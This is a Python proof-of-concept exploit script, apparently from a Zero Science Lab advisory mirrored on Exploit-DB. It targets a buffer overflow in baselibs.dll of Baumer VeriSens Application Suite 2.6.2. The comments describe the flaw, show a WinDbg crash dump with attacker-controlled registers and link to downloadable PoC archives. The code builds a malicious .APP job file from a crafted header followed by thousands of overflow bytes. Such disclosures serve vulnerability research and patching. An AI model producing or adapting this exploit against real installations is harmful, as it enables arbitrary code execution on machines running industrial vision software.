#!/usr/bin/env python
#
#
# Baumer VeriSens Application Suite 2.6.2 Buffer Overflow Vulnerability
#
#
# Vendor: Baumer Holding AG | Baumer Optronic GmbH
# Product web page: http://www.baumer.com
# Software link: http://www.baumer.com/us-en/products/identification-image-processing/software-and-starter-kits/verisens-application-suite/
# Affected version: 2.6.2 (ID-CS-XF-XC)
#
# Summary: The Baumer Application Suite is the intuitive configuration
# software for VeriSens vision sensors, which makes it quick and simple
# for even new users to implement image processing tasks. Starting with
# the creation of test tasks through to the management of jobs, the program
# will take you through just a few steps to reach your goal.
#
# Desc: The vulnerability is caused due to a boundary error in baselibs.dll
# library when processing device job file, which can be exploited to cause
# a buffer overflow when a user opens e.g. a specially crafted .APP file.
# Successful exploitation could allow execution of arbitrary code on the
# affected machine.
#
# -------------------------------------------------------------------------
# (78c.cb0): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# Exported symbols for C:\Program Files (x86)\Baumer\VeriSens Application Suite v2.6.2\AppSuite\baselibs.dll - 
# eax=4d81ab45 ebx=4d81ab45 ecx=41414141 edx=41414141 esi=4d81ab45 edi=0c17e010
# eip=56bc4186 esp=0040a020 ebp=0040a020 iopl=0         nv up ei pl nz na po nc
# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
# baselibs!b_Int_restore+0x6:
# 56bc4186 8b00            mov     eax,dword ptr [eax]  ds:002b:4d81ab45=????????
# 0:000> u
# baselibs!b_Int_restore+0x6:
# 56bc4186 8b00            mov     eax,dword ptr [eax]
# 56bc4188 8bc8            mov     ecx,eax
# 56bc418a 8bd0            mov     edx,eax
# 56bc418c c1ea18          shr     edx,18h
# 56bc418f c1f908          sar     ecx,8
# 56bc4192 81e100ff0000    and     ecx,0FF00h
# 56bc4198 0bca            or      ecx,edx
# 56bc419a 8bd0            mov     edx,eax
# 0:000> dds
# 56bc6b86  00107d80
# 56bc6b8a  8b117457
# 56bc6b8e  f0e181cb
# 56bc6b92  e8000000
# 56bc6b96  fffff9e6
# 56bc6b9a  02ebf88b
# 56bc6b9e  ff85fa8b
# 56bc6ba6  68000001
# 56bc6baa  56c2afa4 baselibs!VsInfoFeed::Listener::`vftable'+0xb154
# 56bc6bae  3f8ce857
# 56bc6bb2  c483ffff
# 56bc6bb6  75c0850c USER32!SetKeyboardState+0x705a
# 56bc6bba  325b5f07
# -------------------------------------------------------------------------
#
# Tested on: Microsoft Windows 7 Professional SP1 (EN)
#            Microsoft Windows 7 Ultimate SP1 (EN)
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2016-5303
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5303.php
#
#
# 14.11.2015
#

header = ("\x00\x00\x00\x01\x00\x00\x00\x04\x95\xCF\x82\xF6\x00\x00\x00"
          "\x01\x00\x00\x00\x04\x00\x00\x00\x2B\x00\x00\x00\x50\x00\x00"
          " \x00\x05\x43\x6F\x64\x65\x00\x00\x00\x00\x50\x00\x00\x00\x01"
          "\x00\x00\x00\x00\x50\x00\x00\x00") #\x0F

buffer = "\x41" * 6719 + "\x42\x42\x42\x42"
 
f = open ("exploit.app", "w")
f.write(header + buffer +'\x0F')
f.close()
print "File exploit.app created!\n"

#
# PoC: http://www.zeroscience.mk/codes/bvas-5303.app.zip
#          https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39403.zip
#